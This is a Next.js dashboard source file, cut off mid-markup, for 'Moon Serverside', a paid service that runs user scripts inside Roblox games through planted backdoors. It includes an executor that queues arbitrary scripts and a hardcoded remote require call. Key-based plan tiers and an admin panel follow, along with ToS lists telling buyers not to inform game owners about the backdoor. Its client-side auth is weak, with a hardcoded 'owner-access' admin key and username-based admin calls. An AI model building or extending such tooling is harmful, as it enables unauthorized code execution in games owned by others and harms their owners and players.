"use client"

import { useState, useEffect, useCallback } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import Link from "next/link"
import { 
  Home, 
  Gamepad2, 
  Settings, 
  LogOut, 
  ChevronRight,
  Users,
  Zap,
  Clock,
  Shield,
  ExternalLink,
  Search,
  Bell,
  Crown,
  UserX,
  Globe,
  Trash2,
  Edit3,
  Plus,
  X,
  RefreshCw,
  UserPlus,
  Link2,
  Play,
  Eye,
  Copy,
  Check,
  FileText,
  Key,
  Loader2,
  AlertTriangle,
  Lock,
  Camera,
  Webhook,
  
  Terminal,
  Palette,
  FileCode,
  ScrollText
} from "lucide-react"

type UserPlan = "none" | "standard" | "premium"

type User = {
  id: string
  username: string
  role: string
  email?: string
  sessionToken?: string
  plan?: UserPlan
  robloxUsername?: string | null
  avatar?: string | null
}

type AdminUser = {
  id: string
  username: string
  email: string
  role: string
  ip: string
  createdAt: string
  lastLogin: string
  isOnline: boolean
  plan: UserPlan
  robloxUsername: string | null
}

type BlacklistedUser = {
  id: string
  username: string
  reason: string
  blacklistedBy: string
  blacklistedAt: string
}

type Game = {
  id: string
  name: string
  players: number
  status: "online" | "offline" | "maintenance"
  imageUrl: string
  gameUrl: string
  placeId: string
}

type StaffAccount = {
  id: string
  username: string
  email: string
  createdAt: string
  isOnline: boolean
}

type Tab = "home" | "games" | "executor" | "whitelist" | "tos" | "settings" | "admin"

type ScriptLog = {
  id: string
  username: string
  robloxUsername: string
  script: string
  gameId: string
  gameName: string
  timestamp: string
}

type WhitelistKey = {
  key: string
  plan: UserPlan
  createdAt: string
  createdBy: string
  usedBy: string | null
  usedAt: string | null
}

// ToS content
const STANDARD_TOS = [
  "Do NOT use external Executors (E.g: Exser, Polaria)",
  "Do NOT snitch in game (e.g., saying \"Moon Serverside\", talking about backdoors)",
  "Do NOT use C00lkidd-like GUIs (e.g., k00pgui)",
  "Do NOT reverse engineer",
  "Do NOT abuse the tool while the developer is in-game",
  "Do NOT use for any unlawful activities",
  "Do NOT shutdown servers without valid reason",
  "Do NOT use NSFW scripts (Instant blacklist)",
  "Do NOT teleport players to other games",
  "Do NOT use obfuscated scripts (Instant blacklist; appeal possible)",
  "Do NOT infect/backdoor games",
  "Do NOT mass ban",
  "Do NOT use MarketplaceService to prompt gamepass purchases",
  "Do NOT run Dex",
  "Do NOT change maps (unless fewer than 3 players are present)",
  "Do NOT insert anti-leave scripts",
  "Do NOT leak games",
  "Do NOT mass-kill players",
  "Do NOT run scripts for non-buyers",
  "Avoid flexing/showing off, may result in reports or blacklisting",
]

const PREMIUM_TOS = [
  "No NSFW/Racist or religious content",
  "No snitching or informing game owners about the backdoor",
  "No teleporting players to other games",
  "No removing Moon GUI from other players",
  "No infecting or backdooring the game with a custom serverside",
  "No changing map if game has 7+ players",
]

export default function DashboardPage() {
  const router = useRouter()
  const [user, setUser] = useState<User | null>(null)
  const [activeTab, setActiveTab] = useState<Tab>("home")
  const [copied, setCopied] = useState<string | null>(null)

  // Admin state
  const [adminUsers, setAdminUsers] = useState<AdminUser[]>([])
  const [blacklistedUsers, setBlacklistedUsers] = useState<BlacklistedUser[]>([])
  const [games, setGames] = useState<Game[]>([])
  const [staffAccounts, setStaffAccounts] = useState<StaffAccount[]>([])
  const [adminTab, setAdminTab] = useState<"users" | "blacklist" | "keys" | "logs" | "webhooks" | "staff">("users")
  const [loading, setLoading] = useState(false)
  
  // Whitelist state
  const [robloxInput, setRobloxInput] = useState("")
  const [whitelistLoading, setWhitelistLoading] = useState(false)
  const [whitelistError, setWhitelistError] = useState("")
  const [whitelistSuccess, setWhitelistSuccess] = useState("")
  
  // Modals
  const [blacklistModal, setBlacklistModal] = useState<{ open: boolean; username: string }>({ open: false, username: "" })
  const [blacklistReason, setBlacklistReason] = useState("")
  const [gameModal, setGameModal] = useState<{ open: boolean; game: Game | null }>({ open: false, game: null })
  const [staffModal, setStaffModal] = useState(false)
  const [newGameUrl, setNewGameUrl] = useState("")
  const [newGameStatus, setNewGameStatus] = useState<"online" | "offline" | "maintenance">("online")
  const [fetchingGame, setFetchingGame] = useState(false)
  const [fetchedGameData, setFetchedGameData] = useState<{ name: string; players: number; thumbnail: string; placeId: string } | null>(null)
  const [newStaffUsername, setNewStaffUsername] = useState("")
  const [newStaffPassword, setNewStaffPassword] = useState("")
  const [newStaffEmail, setNewStaffEmail] = useState("")
  const [toast, setToast] = useState<{ message: string; type: "success" | "error" } | null>(null)
  const [avatarUploading, setAvatarUploading] = useState(false)
  const [webhookKey, setWebhookKey] = useState("")
  const [siteUrl, setSiteUrl] = useState("https://moonss.vercel.app")
  const [whitelistKeys, setWhitelistKeys] = useState<WhitelistKey[]>([])
  const [keyInput, setKeyInput] = useState("")
  const [robloxWebhookUrl, setRobloxWebhookUrl] = useState("")
  const [scriptInput, setScriptInput] = useState("")
  const [executorLoading, setExecutorLoading] = useState(false)
  const [scriptLogs, setScriptLogs] = useState<ScriptLog[]>([])
  const [colorTheme, setColorTheme] = useState<string>("blue")

  const isOwner = user?.role === "owner"
  const isStaff = user?.role === "staff"
  const isAdmin = isOwner || isStaff
  const userPlan = user?.plan || "none"
  const hasAccess = userPlan !== "none" // Staff/Owner need to redeem key too
  const canAccessAdmin = isAdmin // But can still access admin panel

  const showToast = (message: string, type: "success" | "error") => {
    setToast({ message, type })
    setTimeout(() => setToast(null), 3000)
  }

  const formatPlayers = (count: number): string => {
    if (count >= 1000000) return `${(count / 1000000).toFixed(1)}M`
    if (count >= 1000) return `${(count / 1000).toFixed(0)}K`
    return String(count)
  }

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

const fetchAdminData = useCallback(async () => {
    if (!user || !isAdmin) return
    setLoading(true)
    try {
      const requests = [
        fetch(`/api/admin?action=users&admin=${user.username}`),
        fetch(`/api/admin?action=blacklist&admin=${user.username}`),
        fetch(`/api/admin?action=games&admin=${user.username}`),
      ]
      
      if (isOwner) {
        requests.push(fetch(`/api/admin?action=staff&admin=${user.username}`))
        requests.push(fetch(`/api/admin?action=keys&admin=${user.username}`))
        requests.push(fetch(`/api/admin?action=webhookInfo&admin=${user.username}`))
      }
      
      const responses = await Promise.all(requests)
      const results = await Promise.all(responses.map(r => r.json()))
      
      if (results[0]?.users) setAdminUsers(results[0].users)
      if (results[1]?.blacklist) setBlacklistedUsers(results[1].blacklist)
      if (results[2]?.games) setGames(results[2].games)
      if (isOwner && results[3]?.staff) setStaffAccounts(results[3].staff)
      if (isOwner && results[4]?.keys) setWhitelistKeys(results[4].keys)
      if (isOwner && results[5]?.webhookKey) {
        setWebhookKey(results[5].webhookKey)
        setRobloxWebhookUrl(results[5].webhookUrl)
      }
    } catch (err) {
      console.error("Failed to fetch admin data", err)
    }
    setLoading(false)
  }, [user, isAdmin, isOwner])

  // Fetch games for all users
  const fetchGames = useCallback(async () => {
    try {
      const res = await fetch("/api/games")
      const data = await res.json()
      if (data.games) setGames(data.games)
    } catch {
      // Ignore
    }
  }, [])

// Fetch webhook key (owner only)
  const fetchWebhookKey = useCallback(async () => {
    if (!isOwner) return
    try {
      const res = await fetch("/api/webhook?action=getKey&adminKey=owner-access")
      const data = await res.json()
      if (data.webhookKey) setWebhookKey(data.webhookKey)
    } catch {
      // Ignore
    }
  }, [isOwner])

  // Generate whitelist key
  const generateKey = async (plan: "standard" | "premium") => {
    if (!user || !isOwner) return
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "generateKey",
          adminUsername: user.username,
          plan,
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`${plan.charAt(0).toUpperCase() + plan.slice(1)} key generated!`, "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to generate key", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

// Delete whitelist key
  const deleteKey = async (keyId: string) => {
    if (!user || !isOwner) return
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "deleteKey",
          adminUsername: user.username,
          keyId,
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast("Key deleted", "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to delete key", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  // Redeem key (for users)
  const redeemKey = async () => {
    if (!user || !keyInput.trim()) return
    setWhitelistLoading(true)
    setWhitelistError("")
    setWhitelistSuccess("")
    try {
      const res = await fetch("/api/whitelist", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user.username,
          key: keyInput.trim(),
        }),
      })
      const data = await res.json()
      if (data.success) {
        setWhitelistSuccess(data.message || "Plan activated!")
        setKeyInput("")
        // Update local user state
        setUser(prev => prev ? { ...prev, plan: data.plan } : null)
        // Also update in localStorage
        const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
        session.plan = data.plan
        localStorage.setItem("moonss_session", JSON.stringify(session))
      } else {
        setWhitelistError(data.error || "Failed to redeem key")
      }
    } catch {
      setWhitelistError("Something went wrong")
    }
    setWhitelistLoading(false)
  }

  // Execute script
  const executeScript = async (scriptType?: "r6") => {
    if (!user) {
      showToast("Please log in first", "error")
      return
    }
    
    // Check plan first - show message if no plan
    if (userPlan === "none") {
      showToast("You need an active plan to use the executor. Go to Whitelist to redeem a key.", "error")
      return
    }
    
    // Check roblox link
    if (!user.robloxUsername) {
      showToast("You need to link your Roblox account first. Go to Whitelist.", "error")
      return
    }

    let script = scriptInput.trim()
    if (scriptType === "r6") {
      script = `require(3436957371):r6("${user.robloxUsername}")`
    }
    
    if (!script) {
      showToast("Please enter a script", "error")
      return
    }

    setExecutorLoading(true)
    try {
      const res = await fetch("/api/executor", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user.username,
          script,
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast("Script queued! Will execute when you're found in a game.", "success")
        if (!scriptType) setScriptInput("")
      } else {
        showToast(data.error || "Failed to queue script", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
    setExecutorLoading(false)
  }

  // Fetch script logs (admin only)
  const fetchScriptLogs = useCallback(async () => {
    if (!user || !isAdmin) return
    try {
      const res = await fetch(`/api/executor?admin=${user.username}`)
      const data = await res.json()
      if (data.logs) setScriptLogs(data.logs)
    } catch {
      // Ignore
    }
  }, [user, isAdmin])

  // Theme handling
  const changeTheme = (theme: string) => {
    setColorTheme(theme)
    document.documentElement.setAttribute("data-theme", theme)
    localStorage.setItem("moonss_theme", theme)
  }

  // Set site URL on mount
  useEffect(() => {
    setSiteUrl(window.location.origin)
  }, [])

  // Load theme on mount
  useEffect(() => {
    const savedTheme = localStorage.getItem("moonss_theme")
    if (savedTheme) {
      setColorTheme(savedTheme)
      document.documentElement.setAttribute("data-theme", savedTheme)
    }
  }, [])
  
  const refreshGameData = useCallback(async () => {
    if (games.length === 0) return
    
    const updatedGames = await Promise.all(
      games.map(async (game) => {
        if (!game.placeId) return game
        try {
          const res = await fetch(`/api/roblox?placeId=${game.placeId}`)
          const data = await res.json()
          if (data.success) {
            return {
              ...game,
              players: data.players,
              name: data.name || game.name,
              imageUrl: data.thumbnail || game.imageUrl
            }
          }
        } catch {
          // Ignore errors
        }
        return game
      })
    )
    setGames(updatedGames)
  }, [games])

  useEffect(() => {
    // Check localStorage first
    const session = localStorage.getItem("moonss_session")
    if (session) {
      try {
        const parsed = JSON.parse(session)
        // Check if session is expired
        if (parsed.expiresAt && Date.now() > parsed.expiresAt) {
          localStorage.removeItem("moonss_session")
          router.push("/login")
          return
        }
        setUser(parsed)
        return
      } catch {
        localStorage.removeItem("moonss_session")
      }
    }
    
    // Check cookie as fallback
    const cookies = document.cookie.split(";")
    const authCookie = cookies.find(c => c.trim().startsWith("moonss_auth="))
    if (authCookie) {
      try {
        const value = decodeURIComponent(authCookie.split("=")[1])
        const parsed = JSON.parse(value)
        if (parsed.expiresAt && Date.now() > parsed.expiresAt) {
          document.cookie = "moonss_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"
          router.push("/login")
          return
        }
        setUser(parsed)
        localStorage.setItem("moonss_session", value)
        return
      } catch {
        // Invalid cookie
      }
    }
    
    router.push("/login")
  }, [router])

  // Refresh user data from server on first load
  useEffect(() => {
    if (!user) return
    
    const refreshUserData = async () => {
      try {
        const res = await fetch("/api/auth/check", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: user.username }),
        })
        const data = await res.json()
        
        if (data.valid && data.user) {
          setUser(prev => prev ? {
            ...prev,
            plan: data.user.plan,
            robloxUsername: data.user.robloxUsername,
            avatar: data.user.avatar,
            role: data.user.role,
          } : null)
          
          // Update localStorage
          const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
          session.plan = data.user.plan
          session.robloxUsername = data.user.robloxUsername
          session.avatar = data.user.avatar
          session.role = data.user.role
          localStorage.setItem("moonss_session", JSON.stringify(session))
        }
      } catch {
        // Ignore errors
      }
    }
    
    refreshUserData()
  }, [user?.username]) // Run when user changes

  // Fetch admin data immediately when user loads and is admin
  useEffect(() => {
    if (user && isAdmin) {
      fetchAdminData()
      fetchScriptLogs()
      if (isOwner) fetchWebhookKey()
    }
  }, [user, isAdmin, isOwner, fetchAdminData, fetchWebhookKey, fetchScriptLogs])

  // Also refresh when switching to admin tab
  useEffect(() => {
    if (user && isAdmin && activeTab === "admin") {
      fetchAdminData()
    }
  }, [activeTab, user, isAdmin, fetchAdminData])

  useEffect(() => {
    if (user && activeTab === "games") {
      fetchGames()
    }
  }, [user, activeTab, fetchGames])

  // Fetch games for executor tab too
  useEffect(() => {
    if (user && activeTab === "executor" && games.length === 0) {
      fetchGames()
    }
  }, [user, activeTab, games.length, fetchGames])

  useEffect(() => {
    if (activeTab === "games" && games.length > 0) {
      const interval = setInterval(refreshGameData, 30000)
      return () => clearInterval(interval)
    }
  }, [activeTab, games.length, refreshGameData])



  // Refresh all data every 5 minutes to keep in sync with database
  useEffect(() => {
    if (!user) return
    
    const refreshAllData = () => {
      fetchGames()
      if (isAdmin) {
        fetchAdminData()
        fetchScriptLogs()
      }
    }

    // Refresh every 5 minutes (300000ms)
    const interval = setInterval(refreshAllData, 300000)
    return () => clearInterval(interval)
  }, [user, isAdmin, fetchGames, fetchAdminData, fetchScriptLogs])
  
  useEffect(() => {
    if (!user) return
  
    const checkSession = async () => {
      try {
        const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
        
        // First check client-side expiration
        if (session.expiresAt && Date.now() > session.expiresAt) {
          localStorage.removeItem("moonss_session")
          document.cookie = "moonss_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"
          router.push("/login")
          return
        }
        
        // Only check blacklist status on server (don't rely on session token validation)
        const res = await fetch("/api/auth/check", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: session.username,
            sessionToken: session.sessionToken
          }),
        })
        const data = await res.json()
        
        // Only log out if explicitly blacklisted
        if (data.blacklisted) {
          localStorage.removeItem("moonss_session")
          document.cookie = "moonss_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"
          router.push("/login")
          return
        }
        
        // Update user data from server (in case plan changed, etc.)
        if (data.valid && data.user) {
          setUser(prev => prev ? {
            ...prev,
            plan: data.user.plan,
            robloxUsername: data.user.robloxUsername,
            avatar: data.user.avatar,
          } : null)
          
          // Also update localStorage
          const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
          session.plan = data.user.plan
          session.robloxUsername = data.user.robloxUsername
          localStorage.setItem("moonss_session", JSON.stringify(session))
        }
      } catch {
        // Ignore errors - network issues shouldn't log user out
      }
    }
    
    const interval = setInterval(checkSession, 30000)
    return () => clearInterval(interval)
  }, [user, router])

  const handleLogout = () => {
    localStorage.removeItem("moonss_session")
    document.cookie = "moonss_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"
    router.push("/")
  }

  const handleAvatarUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file || !user) return

    // Check file size (max 2MB)
    if (file.size > 2 * 1024 * 1024) {
      showToast("Image must be less than 2MB", "error")
      return
    }

    // Check file type
    if (!file.type.startsWith("image/")) {
      showToast("Please upload an image file", "error")
      return
    }

    setAvatarUploading(true)

    try {
      // Convert to base64
      const reader = new FileReader()
      reader.onload = async () => {
        const base64 = reader.result as string

        const res = await fetch("/api/user/avatar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: user.username,
            avatar: base64,
          }),
        })

        const data = await res.json()

        if (data.success) {
          setUser(prev => prev ? { ...prev, avatar: base64 } : prev)
          const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
          session.avatar = base64
          localStorage.setItem("moonss_session", JSON.stringify(session))
          showToast("Profile picture updated!", "success")
        } else {
          showToast(data.error || "Failed to update avatar", "error")
        }
        setAvatarUploading(false)
      }
      reader.readAsDataURL(file)
    } catch {
      showToast("Something went wrong", "error")
      setAvatarUploading(false)
    }
  }

// Link Roblox account
  const handleLinkRoblox = async () => {
    if (!robloxInput.trim()) {
      setWhitelistError("Please enter your Roblox username")
      return
    }
    
    setWhitelistLoading(true)
    setWhitelistError("")
    setWhitelistSuccess("")
    
    try {
      const res = await fetch("/api/whitelist", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user?.username,
          robloxUsername: robloxInput.trim()
        }),
      })
      
      const data = await res.json()
      
      if (data.success) {
        setWhitelistSuccess(data.message || "Roblox account linked!")
        // Update user state
        setUser(prev => prev ? { ...prev, robloxUsername: data.robloxUsername } : prev)
        // Update localStorage
        const session = JSON.parse(localStorage.getItem("moonss_session") || "{}")
        session.robloxUsername = data.robloxUsername
        localStorage.setItem("moonss_session", JSON.stringify(session))
        setRobloxInput("")
      } else {
        setWhitelistError(data.error || "Failed to link account")
      }
    } catch {
      setWhitelistError("Something went wrong. Please try again.")
    }
    
    setWhitelistLoading(false)
  }

  // Admin actions
  const handleForceLogout = async (username: string) => {
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "forceLogout", 
          adminUsername: user?.username,
          username 
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`${username} has been logged out`, "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to logout user", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const handleBlacklist = async () => {
    if (!blacklistReason.trim()) {
      showToast("Please provide a reason", "error")
      return
    }
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "blacklist", 
          adminUsername: user?.username,
          username: blacklistModal.username,
          reason: blacklistReason
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`${blacklistModal.username} has been blacklisted`, "success")
        setBlacklistModal({ open: false, username: "" })
        setBlacklistReason("")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to blacklist user", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const handleUnblacklist = async (username: string) => {
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "unblacklist", 
          adminUsername: user?.username,
          username
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`${username} has been unblacklisted`, "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to unblacklist user", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const fetchGameFromUrl = async () => {
    const match = newGameUrl.match(/roblox\.com\/games\/(\d+)/)
    if (!match) {
      showToast("Invalid Roblox game URL", "error")
      return
    }
    
    const placeId = match[1]
    setFetchingGame(true)
    
    try {
      const res = await fetch(`/api/roblox?placeId=${placeId}`)
      const data = await res.json()
      
      if (data.success || data.name) {
        setFetchedGameData({
          name: data.name || "Unknown Game",
          players: data.players || 0,
          thumbnail: data.thumbnail || "",
          placeId
        })
      } else {
        showToast("Could not fetch game info", "error")
      }
    } catch {
      showToast("Failed to fetch game info", "error")
    }
    
    setFetchingGame(false)
  }

  const handleSaveGame = async () => {
    if (!fetchedGameData && !gameModal.game) {
      showToast("Please fetch game info first", "error")
      return
    }
    
    try {
      const action = gameModal.game ? "updateGame" : "addGame"
      const body = gameModal.game 
        ? { 
            action, 
            adminUsername: user?.username,
            gameId: gameModal.game.id,
            updates: { 
              name: fetchedGameData?.name || gameModal.game.name,
              players: fetchedGameData?.players || gameModal.game.players,
              status: newGameStatus,
              imageUrl: fetchedGameData?.thumbnail || gameModal.game.imageUrl,
              gameUrl: newGameUrl || gameModal.game.gameUrl,
              placeId: fetchedGameData?.placeId || gameModal.game.placeId
            }
          }
        : {
            action,
            adminUsername: user?.username,
            name: fetchedGameData?.name,
            players: fetchedGameData?.players || 0,
            status: newGameStatus,
            imageUrl: fetchedGameData?.thumbnail || "",
            gameUrl: newGameUrl,
            placeId: fetchedGameData?.placeId
          }

      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      })
      const data = await res.json()
      if (data.success) {
        showToast(gameModal.game ? "Game updated" : "Game added", "success")
        closeGameModal()
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to save game", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const handleDeleteGame = async (gameId: string) => {
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "deleteGame", 
          adminUsername: user?.username,
          gameId
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast("Game deleted", "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to delete game", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const openEditGame = (game: Game) => {
    setNewGameUrl(game.gameUrl)
    setNewGameStatus(game.status)
    setFetchedGameData({
      name: game.name,
      players: game.players,
      thumbnail: game.imageUrl,
      placeId: game.placeId
    })
    setGameModal({ open: true, game })
  }

  const closeGameModal = () => {
    setGameModal({ open: false, game: null })
    setNewGameUrl("")
    setNewGameStatus("online")
    setFetchedGameData(null)
  }

  const handleCreateStaff = async () => {
    if (!newStaffUsername || !newStaffPassword || !newStaffEmail) {
      showToast("All fields are required", "error")
      return
    }
    
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "createStaff", 
          adminUsername: user?.username,
          username: newStaffUsername,
          password: newStaffPassword,
          email: newStaffEmail
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`Staff account "${newStaffUsername}" created`, "success")
        setStaffModal(false)
        setNewStaffUsername("")
        setNewStaffPassword("")
        setNewStaffEmail("")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to create staff", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

  const handleDeleteStaff = async (username: string) => {
    try {
      const res = await fetch("/api/admin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "deleteStaff", 
          adminUsername: user?.username,
          username
        }),
      })
      const data = await res.json()
      if (data.success) {
        showToast(`Staff "${username}" deleted`, "success")
        fetchAdminData()
      } else {
        showToast(data.error || "Failed to delete staff", "error")
      }
    } catch {
      showToast("Something went wrong", "error")
    }
  }

const sidebarItems = [
    { id: "home" as Tab, label: "Home", icon: Home },
    { id: "games" as Tab, label: "Games", icon: Gamepad2 },
    { id: "executor" as Tab, label: "Executor", icon: Terminal },
    
    { id: "whitelist" as Tab, label: "Whitelist", icon: Key },
    { id: "tos" as Tab, label: "ToS", icon: FileText },
    { id: "settings" as Tab, label: "Settings", icon: Settings },
    ...(canAccessAdmin ? [{ id: "admin" as Tab, label: "Admin Panel", icon: Shield }] : []),
  ]

  const themes = [
    { id: "blue", label: "Blue", color: "bg-blue-500" },
    { id: "purple", label: "Purple", color: "bg-purple-500" },
    { id: "green", label: "Green", color: "bg-green-500" },
    { id: "red", label: "Red", color: "bg-red-500" },
    { id: "orange", label: "Orange", color: "bg-orange-500" },
    { id: "pink", label: "Pink", color: "bg-pink-500" },
  ]

  if (!user) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    )
  }

  return (
    <div className="min-h-screen flex bg-background">
      {/* Toast */}
      {toast && (
        <div className={`fixed top-4 right-4 z-50 px-4 py-3 rounded-lg shadow-lg animate-in slide-in-from-top ${
          toast.type === "success" ? "bg-green-500/90 text-white" : "bg-destructive/90 text-white"
        }`}>
          {toast.message}
        </div>
      )}

      {/* Blacklist Modal */}
      {blacklistModal.open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="relative w-full max-w-md glass-strong rounded-2xl border border-border/50 p-6">
            <button
              onClick={() => { setBlacklistModal({ open: false, username: "" }); setBlacklistReason(""); }}
              className="absolute top-4 right-4 p-1 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors"
            >
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-3 mb-6">
              <div className="h-10 w-10 rounded-lg bg-destructive/20 flex items-center justify-center">
                <UserX className="h-5 w-5 text-destructive" />
              </div>
              <div>
                <h2 className="font-bold text-foreground">Blacklist User</h2>
                <p className="text-sm text-muted-foreground">{blacklistModal.username}</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-sm font-medium text-foreground">Reason</label>
                <textarea
                  value={blacklistReason}
                  onChange={(e) => setBlacklistReason(e.target.value)}
                  className="w-full mt-2 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 resize-none"
                  placeholder="Enter the reason for blacklisting..."
                  rows={3}
                />
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => { setBlacklistModal({ open: false, username: "" }); setBlacklistReason(""); }}
                  className="flex-1 rounded-lg border border-border bg-secondary px-4 py-2.5 text-sm font-medium text-foreground hover:bg-secondary/80 transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleBlacklist}
                  className="flex-1 rounded-lg bg-destructive px-4 py-2.5 text-sm font-medium text-white hover:bg-destructive/90 transition-all"
                >
                  Blacklist
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Game Modal - Owner Only */}
      {gameModal.open && isOwner && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
          <div className="relative w-full max-w-lg glass-strong rounded-2xl border border-border/50 p-6">
            <button
              onClick={closeGameModal}
              className="absolute top-4 right-4 p-1 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors"
            >
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-3 mb-6">
              <div className="h-10 w-10 rounded-lg bg-primary/20 flex items-center justify-center">
                <Gamepad2 className="h-5 w-5 text-primary" />
              </div>
              <div>
                <h2 className="font-bold text-foreground">{gameModal.game ? "Edit Game" : "Add Game"}</h2>
                <p className="text-sm text-muted-foreground">Paste a Roblox game URL</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-sm font-medium text-foreground">Roblox Game URL</label>
                <div className="flex gap-2 mt-2">
                  <input
                    type="text"
                    value={newGameUrl}
                    onChange={(e) => setNewGameUrl(e.target.value)}
                    className="flex-1 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                    placeholder="https://www.roblox.com/games/123456789"
                  />
                  <button
                    onClick={fetchGameFromUrl}
                    disabled={fetchingGame || !newGameUrl}
                    className="rounded-lg bg-primary px-4 py-3 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-all disabled:opacity-50"
                  >
                    {fetchingGame ? <RefreshCw className="h-4 w-4 animate-spin" /> : <Link2 className="h-4 w-4" />}
                  </button>
                </div>
              </div>

              {fetchedGameData && (
                <div className="rounded-lg border border-border bg-secondary/30 p-4">
                  <div className="flex items-center gap-4">
                    {fetchedGameData.thumbnail ? (
                      <img
                        src={fetchedGameData.thumbnail}
                        alt={fetchedGameData.name}
                        className="h-16 w-16 rounded-lg object-cover"
                      />
                    ) : (
                      <div className="h-16 w-16 rounded-lg bg-muted flex items-center justify-center">
                        <Gamepad2 className="h-6 w-6 text-muted-foreground" />
                      </div>
                    )}
                    <div>
                      <p className="font-semibold text-foreground">{fetchedGameData.name}</p>
                      <p className="text-sm text-muted-foreground flex items-center gap-1">
                        <Users className="h-3 w-3" />
                        {formatPlayers(fetchedGameData.players)} playing
                      </p>
                    </div>
                  </div>
                </div>
              )}

              <div>
                <label className="text-sm font-medium text-foreground">Status</label>
                <select
                  value={newGameStatus}
                  onChange={(e) => setNewGameStatus(e.target.value as "online" | "offline" | "maintenance")}
                  className="w-full mt-2 rounded-lg border border-border bg-secondary/50 px-4 py-3 text-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
                >
                  <option value="online">Online</option>
                  <option value="offline">Offline</option>
                  <option value="maintenance">Maintenance</option>
                </select>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={closeGameModal}
                  className="flex-1 rounded-lg border border-border bg-secondary px-4 py-2.5 text-sm font-medium text-foreground hover:bg-secondary/80 transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleSaveGame}
                  disabled={!fetchedGameData && !gameModal.game}
